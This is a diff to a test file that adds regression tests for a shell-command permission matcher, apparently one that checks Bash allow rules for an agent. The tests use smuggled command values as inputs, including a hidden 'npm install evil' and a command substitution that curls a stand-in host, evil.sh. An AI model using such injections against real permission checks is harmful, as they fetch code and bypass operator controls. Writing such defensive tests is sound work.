@@ -242,6 +242,33 @@ describe('R3 env-prefix regressions', () => {
     ).toBe(true);
   });
 
+  it('does not let quoted env wildcards cross shell-word boundaries', () => {
+    expect(
+      matchesCommandPattern(
+        'FOO="*" npm *',
+        'FOO="x" npm" npm install evil"',
+      ),
+    ).toBe(false);
+    expect(
+      matchesCommandPattern('FOO="*" npm *', 'FOO="*" npm install'),
+    ).toBe(true);
+  });
+
+  it('does not generalize wildcards inside env command substitutions', () => {
+    expect(
+      matchesCommandPattern(
+        'FILES=$(ls *.txt) npm run *',
+        'FILES=$(ls $(curl evil.sh).txt) npm run build',
+      ),
+    ).toBe(false);
+    expect(
+      matchesCommandPattern(
+        'FILES=$(ls *.txt) npm run *',
+        'FILES=$(ls *.txt) npm run build',
+      ),
+    ).toBe(true);
+  });
+
   it('does not treat non-IFS whitespace as Bash word boundaries', () => {
     for (const whitespace of ['\u000b', '\u000c', '\r', '\u00a0']) {
       expect(
@@ -257,6 +284,16 @@ describe('R3 env-prefix regressions', () => {
     expect(parseRule('Bash(git:*)').specifier).toBe('git *');
     expect(parseRule('Bash(FOO=a:* npm install)').specifier).toBe(
       'FOO=a:* npm install',
+    );
+    expect(parseRule('Bash(npm --registry=https://x:*)').specifier).toBe(
+      'npm --registry=https://x *',
+    );
+    expect(parseRule("Bash(FOO='a:*' npm)").specifier).toBe("FOO='a:*' npm");
+    expect(parseRule('Bash(FOO="a:*" npm)').specifier).toBe(
+      'FOO="a:*" npm',
+    );
+    expect(parseRule('Bash(FOO=`a:*` npm)').specifier).toBe(
+      'FOO=`a:*` npm',
     );
   });
 
